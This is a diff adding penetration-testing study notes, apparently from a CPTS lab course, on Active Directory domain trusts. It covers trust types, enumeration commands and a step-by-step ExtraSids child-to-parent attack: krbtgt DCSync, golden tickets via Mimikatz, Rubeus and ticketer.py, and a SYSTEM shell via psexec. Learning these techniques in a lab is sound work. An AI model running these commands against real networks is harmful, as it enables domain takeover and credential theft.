@@ -136,3 +136,132 @@ Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
 ```
 
 ACLs can also be enumerated easily by using bloodhoud. Look for **outbound control rights** it will give us lot of information.
+
+
+
+
+## Domain trust
+- Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
+- Cross-link: A trust between child domains to speed up authentication.
+- External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
+- Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
+- Forest: A transitive trust between two forest root domains.
+- ESAE: A bastion forest used to manage Active Directory.
+
+Trusts can be transitive or non-transitive.
+
+- A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
+- In a non-transitive trust, the child domain itself is the only one trusted.
+  
+Trusts can be set up in two directions: one-way or two-way (bidirectional).
+
+- One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
+- Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.
+![image](https://github.com/Kript0r3x/CPTS/assets/65650002/200608da-c0f2-4394-bd12-206e8458d7a8)
+### Enumerating Trust Relationships
+```
+Import-Module activedirectory
+Get-ADTrust -Filter *
+```
+### Checking for Existing Trust using Get-DomainTrust
+```
+Get-DomainTrust
+```
+### Using Get-DomainTrustMapping
+```
+Get-DomainTrustMapping
+```
+
+### Checking Users in the Child Domain using Get-DomainUser
+```
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+```
+### Using netdom to query domain trust
+```
+netdom query /domain:inlanefreight.local trust
+```
+### Using netdom to query domain controllers
+```
+netdom query /domain:inlanefreight.local dc
+```
+### Using netdom to query workstations and servers
+```
+netdom query /domain:inlanefreight.local workstation
+```
+
+
+## Attacking Domain Trusts - Child -> Parent Trusts - from windows
+### ExtraSids Attack - Mimikatz
+To perform this attack after compromising a child domain, we need the following:
+
+- The KRBTGT hash for the child domain
+- The SID for the child domain
+- The name of a target user in the child domain (does not need to exist!)
+- The FQDN of the child domain.
+- The SID of the Enterprise Admins group of the root domain.
+- With this data collected, the attack can be performed with Mimikatz.
+
+### Obtaining the KRBTGT Account's NT Hash using Mimikatz
+```
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+```
+### Using Get-DomainSID
+```
+Get-DomainSID
+```
+### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
+```
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
+```
+before starting the attack let's just confirm that we don't have accessot the file system of the DC in the parent domain
+### Using ls to Confirm No Access
+```
+ls \\academy-ea-dc01.inlanefreight.local\c$
+```
+### Creating a Golden Ticket with Mimikatz
+```
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+```
+### Confirming a Kerberos Ticket is in Memory Using list
+```
+klist
+```
+## ExtraSids Attack - Rubeus
+### Creating a Golden Ticket using Rubeus
+```
+.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
+```
+## Attacking Domain Trusts - Child -> Parent Trusts - from Linux
+### Performing DCSync with secretsdump.py
+```
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
+### Performing SID Brute Forcing using lookupsid.py
+```
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+```
+grep the output to look for Domain SUID
+Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.
+### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+```
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+### Constructing a Golden Ticket using ticketer.py
+```
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+```
+The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
+### Setting the KRB5CCNAME Environment Variable
+```
+export KRB5CCNAME=hacker.ccache
+```
+### Getting a SYSTEM shell using Impacket's psexec.py
+```
+psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
+```
+*Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.*
+### Performing the Attack with raiseChild.py
+```
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+```
+
